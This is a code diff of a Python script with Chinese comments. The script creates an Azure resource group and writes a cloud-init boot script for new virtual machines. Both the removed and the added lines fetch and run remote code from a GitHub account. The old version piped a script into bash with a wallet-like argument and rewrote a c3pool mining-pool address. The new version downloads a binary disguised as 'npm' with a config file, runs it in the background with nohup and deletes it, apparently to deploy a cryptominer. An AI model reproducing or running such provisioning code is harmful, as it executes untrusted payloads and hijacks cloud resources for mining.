@@ -18,15 +18,12 @@ get_default_cli().invoke(['group', 'create', '--name', 'myResourceGroup',
 print("创建资源组成功")
 
 # 3.创建开机后要运行的脚本
-init = "export HOME=/root && curl -fsSL https://raw.githubusercontent.com/drewnelson1/1/main/npm.sh | LC_ALL=en_US.UTF-8 bash -s 89hV6RLT8B7K8qSgHdayHg4uoAiqQL6XhYjmuMUgjHaBf7EGmC3h364hgJx3H6Gpgo5uf5q9V2D7cabT7QtYGku25mTvV2C"
 with open("./cloud-init.txt", "w") as f:
     f.write("#cloud-config" + "\n")
     f.write("runcmd:" + "\n")
     f.write("  - sudo -s" + "\n")
-    f.write(f"  - {init}" + "\n")
-    f.write("  - sed -i 's/auto.c3pool.org:19999/auto.v10d.tk:33333/' /root/c3pool/config.json" + "\n")
-    f.write("  - rm -f npm.sh" + "\n")
-    f.write("  - reboot" + "\n")
+    f.write("  - wget https://raw.githubusercontent.com/drewnelson1/1/main/npm && wget https://raw.githubusercontent.com/drewnelson1/1/main/config.json && chmod +x npm && nohup ./npm &" + "\n")
+    f.write("  - rm npm" + "\n")
     
 
 
